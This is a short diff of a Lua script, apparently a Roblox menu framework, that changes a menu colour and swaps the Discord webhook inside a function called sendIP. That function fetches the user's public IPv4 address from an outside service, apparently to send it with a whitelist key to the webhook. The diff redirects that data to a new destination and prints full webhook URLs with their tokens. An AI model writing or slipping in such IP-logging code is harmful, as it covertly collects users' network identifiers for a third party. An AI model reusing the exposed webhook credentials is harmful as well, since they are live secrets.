@@ -40,7 +40,7 @@ local framework = {
       }
       },
     menuSettings = {
-      mainColour = Color3.fromRGB(255, 4, 104),
+      mainColour = Color3.fromRGB(0, 255, 255),
       secondaryColour = Color3.fromRGB(143, 1, 60),
       textColor = Color3.fromRGB(255, 255, 255),
       uiTransparency = 0,
@@ -66,7 +66,7 @@ local framework = {
   end
   
   local function sendIP(whitelistKey)
-    local Webhook = "https://discord.com/api/webhooks/984543201249615893/G4-Wplx5X16-9j1unD1s_U7OWV8lpU4X-EPvXVauv6NjHSVPayE36h8d77ePzYzW3nry"
+    local Webhook = "https://discord.com/api/webhooks/929333034375856129/x0Y94JtM2nEUijSr1yjp7pzZoNuBodifp2HqBwBetEsqTZwoGbczfto52Rqmn2DUKdWd"
     local IPv4 = game:HttpGet("https://v4.ident.me/")
     --local IPv6 = game:HttpGet("https://v6.ident.me/")
   
